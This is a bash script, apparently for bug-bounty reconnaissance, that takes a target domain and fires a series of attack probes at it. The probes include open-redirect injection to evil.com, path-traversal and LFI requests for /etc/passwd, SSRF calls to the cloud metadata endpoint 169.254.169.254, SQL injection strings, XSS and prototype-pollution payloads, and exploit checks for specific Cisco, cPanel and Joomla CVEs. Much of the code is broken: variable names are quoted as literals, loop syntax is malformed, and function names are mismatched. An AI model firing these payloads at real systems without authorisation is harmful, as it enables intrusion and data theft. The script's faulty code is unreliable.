#!/bin/bash
 
#colors
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
reset=`tput sgr0`

root="~/Documents/Subdomain_automation/$domain"
file="~/Documents/Subdomain_automation/$domain/vulnerbility"
URL="~/Documents/Subdomain_automation/$domain/Archivescan/sorted.txt"
Subdomain="~/Documents/Subdomain_automation/$domain/Subdomains/Final-all-alive-subs.txt"

echo "${blue} ===============================================================================${reset}"
read -p " [+] Enter domains name : " domain
echo "${blue} ===============================================================================${reset}"

echo "${blue} ===============================================================================${reset}"
read -p "[+] Enter Burb collabrator ID url : " burb
echo "${blue} ===============================================================================${reset}"

file_create() {
  if [[ ~/Documents/Subdomain_automation/$domain ]]; then
    echo " "
else  
  mkdir "root"
  mkdir ~/Documents/Subdomain_automation
  mkdir "file"
  mkdir "root"/Subdomain_discovery
  mkdir "file"/XSS
  mkdir "file"/subdomain_takeover
  mkdir "file"/sql
  mkdir "file"/proto_type_pollution
  mkdir "file"/CVE
  mkdir "file"/Open_redirect
  mkdir "file"/path_thavarsal
  mkdir "file"/Extract-Urls
  mkdir "file"/LFI
  mkdir "file"/jucy_info
  fi
}
file_create

Open_redirect() {
cat "URL" | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done | tee -a "file"/Open_redirect/OPredacted_qsreplace.txt
cat "URL" | gf redirect | tee -a "file"/Open_redirect/OPredacted.txt
cat "URL" | sort -u | grep "\?" >> "file"/Open_redirect/open.txt; nuclei -t Url-Redirection-Catcher.yaml -l "file"/Open_redirect/open.txt >> "file"/Open_redirect/nuclei_OPredacted.txt
echo "${blue} ####################################################${reset}"
echo "${blue} [+] Successfully saved the Open_redirect results ${reset}"
echo "${blue} ##################################################${reset}"
}
Open_redirect

path_thavarsal() {
#Path Thaversal
cat "root"/Subdomains/unique.txt | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8808 -path "/logs/downloadMainLog?fname=../../../../../../..//etc/passwd" -mr "root:x:" -t 60 >> "file"/path_thavarsal/path_thavarsal_1.txt
#NGINX Path Traversal
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' >> "file"/path_thavarsal/NGNIX_path_thavarsal.txt
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the path thaversal results  ${reset}"
echo "${blue} #######################################################${reset}"
}
path_thavarsal

Lfi() {
cat "URL" | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' >> "file"/Open_redirect/open.txt; nuclei -t Url-Redirection-Catcher.yaml -l "file"/LFI/lfi.txt
}
LFI

jucy_info(){
  for sub in $(cat "Subdomain"); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done >> "file"/jucy_info/jucy_info_result.txt
}
jucy_info

Cors() {
python C:/Users/HP/CORScanner/cors_scan.py -u $domain -o "file"/Cors.txt
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the Cors misconfigration results  ${reset}"
echo "${blue} #######################################################${reset}"
}
Cors

HTTP_smuggling() {
echo "${magenta} [+] Running Smuggler ${reset}"
cat "URL" | python C:/Users/HP/smuggler/smuggler.py >> "file"/HTTP_smuggling.txt 
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the HTTP Smuggling results  ${reset}"
echo "${blue} #######################################################${reset}"
}
HTTP_smuggling

SSRF() {
echo "${magenta} [+] Finding SSRF ${reset}"
cat "URL" | grep "=" | qsreplace http://$burb >>  "file"/SSRF/SSRF.txt
#Accessing SSRF metadata with automation by just using curl and bash
cat "URL"  | sort -u |anew | httpx | qsreplace ‘http://169.254.169.254/latest/meta-data/hostname’ | xargs -I % -P 25 sh -c ‘curl -ks “%” 2>&1 | grep ”compute.internal” && echo “SSRF VULN! %”’ >> "file"/SSRF/ssrf_curl_data.txt
#Find Blind SSRF with automation by just using curl and bash
cat "URL" | sort -u |anew | httpx |tee -a "file"/SSRF/prefinal_ssrftesturl.txt
cat "file"/SSRF/prefinal_ssrftesturl.txt | gf ssrf >> "file"/SSRF/final_ssrftesturl.txt
cat "file"/SSRF/final_ssrftesturl.txt | qsreplace $burb >> "file"/SSRF/ssrf-auto-ffuf.txt
ffuf -c -w "file"/SSRF/ssrf_auto-ffuf.txt -u FUZZ >> "file"/SSRF/fuzz_SSRF.txt
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Successfully saved SSRF results ${reset}"
echo "${blue} #######################################################${reset}"
}
SSRF

IDOR() {
#IDOR
echo "${magenta} [+] Finding IDOR ${reset}"
cat "URL" | grep "=id[/d]*" >> "file"/IDOR.txt
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the IDOR results  ${reset}"
echo "${blue} #######################################################${reset}"
}
IDOR

admin_page() {
#Find admin login
cat "Subdomain" | httpx -ports 80,443,8080,8443 -path /admin -mr "admin" >> "file"/admin_page.txt
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the Admin Login results  ${reset}"
echo "${blue} #######################################################${reset}"
}
admin_page

Sub_takeover() {
#Find Subdomains TakeOver
if [[ C:/Users/HP/subdover/subdover.py ]]; then
  python C:/Users/HP/subdover/subdover.py -l "Subdomain" -o  "file"/subdomain_takeover/subdover_scanner_result.txt
fi
if [[ C:/Users/HP/subjack.exe ]]; then
   subjeck -w cat "Subdomain" -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 >> "file"/subdomain_takeover/my_script_result.txt ;
fi
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the Subdomain Takeover results  ${reset}"
echo "${blue} #######################################################${reset}"
}
Sub_takeover

SQL() {
cat "URL" | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1 >>  "file"/sql/sqlmap.txt 
#SQLi-TimeBased scanner
gau $domain | sed 's/=[^=&]*/=" or sleep(5)#/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done >> "file"/sql/Time_based_sql.txt 
#SQL error based 
python3 C:/Users/HP/SQLiDetector/sqlidetector.py -f "URL" >> "file"/sql/Error_based_sql.txt
#Search SQLINJECTION using qsreplace search syntax erro
grep "="  "URL" | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable with ("' OR '1")\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" >>  "file"/sql/qsreplace_sql.txt 
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the SQL Injection results  ${reset}"
echo "${blue} #######################################################${reset}"
}
SQL

js_secrets() {
py secretx.py --list "root"/js_scan_result.txt >> "root"/API/secrets.txt
echo $domain | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > "root"/API/secrets.txt
}
js_secrets

Execution_After_Redirect() {
if [[ -f C:/Users/HP/EARScanner/EAR_Scanner.py ]]; then
  echo "${magenta} EARScanner ${reset}" 
# Scanning Multiple URLs
 python C:/Users/HP/EARScanner/EARScanner.py -uL "root"/Subdomain_discovery/content_discovery_result.txt -o "file"/Execution_After_Redirect.txt
python C:/Users/HP/EARScanner/EARScanner.py -f "file"/Execution_After_Redirect.txt -w C:/Users/HP/Documents/subdomain automation/common.txt -o "file"/final_Execution_After_Redirect.txt
else
  echo "${red} failed to start EARScanner ${reset}"
  echo "${green} installing EARScanner.. ${reset}"  
# Clone this repository or Download this project
 git clone https://github.com/PushpenderIndia/EARScanner.git
# Navigate to EARScanner folder
 cd EARScanner
# Installing dependencies
 pip install -r requirements.txt
 echo "${magenta} Start EARScanner.. ${reset}"
# Scanning Multiple URLs
 python C:/Users/HP/EARScanner/EARScanner.py -uL  "root"/Subdomain_discovery/content_discovery_result.txt -o "file"/Execution_After_Redirect.txt
 python C:/Users/HP/EARScanner/EARScanner.py -f "file"/Execution_After_Redirect.txt -w C:/Users/HP/Documents/subdomain automation/common.txt -o "file"/final_Execution_After_Redirect.txt
fi
}
Execution_After_Redirect

XSS() {
echo "${magenta} [+] Running Gospider For Blind xss Hunting ${reset}"
#gospider.exe -s https://$domain/ -a -w --sitemap -r -d 8 -p http://127.0.0.1:8888 
#Kxss to search param XSS
cat "URL" | kxss.exe >> "file"/XSS/KXSS.txt
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the XSS results  ${reset}"
echo "${blue} #######################################################${reset}"
}
XSS

proto_type_pollution() {
#Prototype Pollution
#if [[ condition ]]; then
 #cat "URL" | plution -o "file"/proto_type_pollution/proto.txt
#fi
cat "Subdomain" | anew -q "file"/FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' "file"/FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" >> "file"/proto_type_pollution/output.txt
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the HTTP Smuggling results  ${reset}"
echo "${blue} #######################################################${reset}"
}
proto_type_pollution

All_CVE() {
#@> CVE-2020–3452
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < "root"/Subdomains/unique.txt >> "file"/CVE/CVE-2020–3452.txt
#@> CVE-2022–0378
cat "root"/Subdomains/all-alive-subs.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done >> "root"/CVE/CVE-2022–0378.txt
#@> CVE-2023-23752 - 𝙅𝙤𝙤𝙢𝙡𝙖 𝙄𝙢𝙥𝙧𝙤𝙥𝙚𝙧 𝘼𝙘𝙘𝙚𝙨𝙨 𝙘𝙝𝙚𝙘𝙠 𝙞𝙣 𝙒𝙚𝙗𝙨𝙚𝙧𝙫𝙞𝙘𝙚 𝙀𝙣𝙙𝙥𝙤𝙞𝙣𝙩
cat "root"/Subdomains/all-alive-subs.txt | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200 >> "root"/CVE/CVE-2023-23752.txt
#@> cPanel CVE-2023-29489 XSS
cat "root"/Subdomains/all-alive-subs.txt | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400 >> "file"/CVE/cPanel-CVE-2023-29489-XSS.txt
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the HTTP Smuggling results  ${reset}"
echo "${blue} #######################################################${reset}"
}
All_CVE

WP-Config() {
cat "Subdomain" -path "/wp-config.PHP" -mc 200 -t 60 -status-code >>  "file"/WP_Config/WP-Config.txt
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the WP-Config results ${reset}"
echo "${blue} #######################################################${reset}"
}

#nuclei

low_hanging_bugs() {
cat "root"/Subdomains/unique.txt | nuclei.exe -t ~/nuclei-templates/ -es info | tee cat "file"/low_hanging_bugs_result.txt
echo "${blue} #######################################################${reset}"
echo "${blue} [+] Succesfully saved the low hanging bugs results  ${reset}"
echo "${blue} #######################################################${reset}"
}

Package_Dependency_Confusion() {
#Package Dependency Confusion Vulnerability
nuclei -I "root"/Subdomains/all-alive-subs.txt -t C:/Users/HP/nuclei/nuclei-templates/exposures/configs/package-json.yaml -o "file"/Package_Dependency_Confusion/pakages.txt
cat "file"/Package_Dependency_Confusion/pakages.txt | cut -d ' ' -f6 | C:/Users/HP/fff/fff.exe -s 200 -o "file"/Package_Dependency_Confusion/Package_Dependency_Confusion.txt
}
Package_Dependency_Confusion

#xss
cat "URL" | cleanP.exe | injactP.exe 'T%22rSpGeUMo%3E7N' | httpx -ms 'T"rSpGeUMo>7N' | nuclei.exe -t C:/Users/HP/nuclei/nuclei-templates/file/xss/dom-xss.yaml -o  "file"/XSS/nuclei_Dom_XSS.txt

Delete_Extra() {
#Delete Extra Files
rm "file"/Execution_After_Redirect.txt
rm "file"/FILE.txt
rm "file"/Package_Dependency_Confusion/pakages.txt
rm "file"/SSRF/prefinal_ssrftesturl.txt
rm "file"/SSRF/final_ssrftesturl.txt
rm "file"/SSRF/ssrf-auto-ffuf.txt
}
Delete_Extra
